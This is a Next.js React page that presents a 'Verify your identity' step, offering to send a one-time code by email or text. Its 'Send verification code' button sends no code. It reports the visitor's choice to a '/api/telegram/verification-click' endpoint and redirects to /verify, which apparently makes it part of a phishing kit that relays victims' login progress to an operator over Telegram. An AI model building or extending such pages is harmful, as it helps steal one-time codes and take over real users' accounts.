"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import {
  Mail,
  MessageSquare,
  ChevronLeft,
  Shield,
  Loader2,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { SiteHeader } from "@/components/site-header";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";

const verificationOptions = [
  {
    id: "email",
    title: "Email",
    description: "We'll send a 6-digit code to your registered email address.",
    icon: Mail,
  },
  {
    id: "text",
    title: "Text message",
    description: "We'll send a 6-digit code to your mobile number on file.",
    icon: MessageSquare,
  },
];

export default function VerifyChoicePage() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<string>("email");

  const handleSendCode = async () => {
    if (isLoading) return;
    setIsLoading(true);

    try {
      await fetch("/api/telegram/verification-click", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ verificationType: selectedMethod }),
      }).catch(console.error);
    } catch (err) {
      console.error("Failed to send verification-click notification:", err);
    }

    setTimeout(() => {
      router.push("/verify");
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <SiteHeader />
      <div className="max-w-2xl px-4 py-8 mx-auto w-full flex-1">
        {/* Progress Indicator */}
        <div className="flex items-center justify-center mb-12 gap-8">
          <div className="flex flex-col items-center">
            <div className="w-10 h-10 rounded-full bg-[#4A90E2] flex items-center justify-center text-white text-sm font-medium">
              ✓
            </div>
            <p className="text-xs text-gray-600 mt-2">Sign in</p>
          </div>

          <div className="flex-1 h-1 bg-gray-200"></div>

          <div className="flex flex-col items-center">
            <div className="w-10 h-10 rounded-full border-2 border-[#4A90E2] flex items-center justify-center text-[#4A90E2] text-sm font-medium">
              2
            </div>
            <p className="text-xs text-[#4A90E2] font-medium mt-2">Verify</p>
          </div>

          <div className="flex-1 h-1 bg-gray-200"></div>

          <div className="flex flex-col items-center">
            <div className="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center text-gray-400 text-sm font-medium">
              3
            </div>
            <p className="text-xs text-gray-400 mt-2">Complete</p>
          </div>
        </div>

        {/* Main Content */}
        <div className="mb-8">
          <h1 className="text-2xl font-bold text-gray-900 mb-3">
            Verify your identity
          </h1>
          <p className="text-gray-600 text-sm mb-6">
            Choose how you&apos;d like to receive your one-time verification
            code.
          </p>

          <button
            onClick={() => router.push("/login")}
            className="flex items-center gap-1 text-[#4A90E2] hover:text-[#357ABD] font-medium text-sm mb-6"
          >
            <ChevronLeft className="w-4 h-4" />
            Back to sign in
          </button>
        </div>

        {/* Verification Options */}
        <RadioGroup
          value={selectedMethod}
          onValueChange={setSelectedMethod}
          className="mb-8"
        >
          <div className="space-y-3">
            {verificationOptions.map(
              ({ id, title, description, icon: Icon }) => (
                <label
                  key={id}
                  className="flex items-center p-4 border border-gray-200 rounded-lg cursor-pointer hover:bg-gray-50 transition-colors"
                >
                  <RadioGroupItem value={id} id={id} className="mr-4" />
                  <div className="flex items-start gap-3 flex-1">
                    <div className="mt-1">
                      <Icon className="w-5 h-5 text-[#4A90E2]" />
                    </div>
                    <div>
                      <p className="text-gray-900 font-medium text-sm">
                        {title}
                      </p>
                      <p className="text-gray-600 text-sm mt-1">
                        {description}
                      </p>
                    </div>
                  </div>
                </label>
              ),
            )}
          </div>
        </RadioGroup>

        {/* Security Note */}
        <div className="flex gap-3 p-4 bg-gray-50 rounded-lg mb-8">
          <Shield className="w-5 h-5 text-[#4A90E2] shrink-0 mt-0.5" />
          <p className="text-gray-700 text-sm">
            For your security, this code expires in a few minutes and can only
            be used once.
          </p>
        </div>

        {/* Action Buttons */}
        <div className="space-y-3">
          <Button
            onClick={handleSendCode}
            disabled={isLoading}
            className="w-full bg-[#4A90E2] hover:bg-[#357ABD] text-white font-medium py-3 rounded-lg"
          >
            {isLoading && <Loader2 className="w-4 h-4 mr-2 animate-spin" />}
            {isLoading ? "Sending..." : "Send verification code"}
          </Button>

          <Button
            onClick={() => router.push("/verify-choice")}
            variant="outline"
            disabled={isLoading}
            className="w-full border-[#4A90E2] text-[#4A90E2] font-medium py-3 rounded-lg hover:bg-gray-50"
          >
            Cancel
          </Button>
        </div>
      </div>
    </div>
  );
}
